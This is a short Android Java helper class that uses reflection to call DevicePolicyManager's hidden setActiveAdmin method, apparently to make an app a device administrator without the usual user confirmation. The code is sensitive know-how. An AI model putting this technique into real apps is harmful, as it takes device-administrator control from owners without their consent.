package com.android.deviceinfo;

import java.lang.reflect.Method;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class Reflect {
	private static final String TAG = "Reflect";

	private static Method setActiveAdminPtr;

	static {
		initCompatibility();
	};

	public static void initCompatibility() {
		try {
			String methodName = "setActiveAdmin";

			// 1st param - method name
			// 2nd param - class for each paramater
			setActiveAdminPtr = DevicePolicyManager.class.getMethod(methodName, ComponentName.class);

			// Print class methods
			String sClassName = "android.app.admin.DevicePolicyManager";

			try {  
				Class classToInvestigate = Class.forName(sClassName);  

				Method[] aClassMethods = classToInvestigate.getDeclaredMethods();  

				for (Method m : aClassMethods) {  
					if (Cfg.DEBUG) {
						Check.log(TAG + " (initCompatibility) Method: " + m); //$NON-NLS-1$
					}
				}  
			} catch (ClassNotFoundException e) {  
				// Class not found!  
			} catch (Exception e) {  
				// Unknown exception  
			}
		} catch (NoSuchMethodException nsme) {
			if (Cfg.EXCEPTION) {
				nsme.printStackTrace();
			}
		}
	}

	// 1st param: class object on which we want to call the method
	// 2nd param: paramater(s)
	public static void setActiveAdmin(DevicePolicyManager dpm, ComponentName name) {
		try {
			setActiveAdminPtr.invoke(dpm, name);
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				e.printStackTrace();
			}
		}
	}
}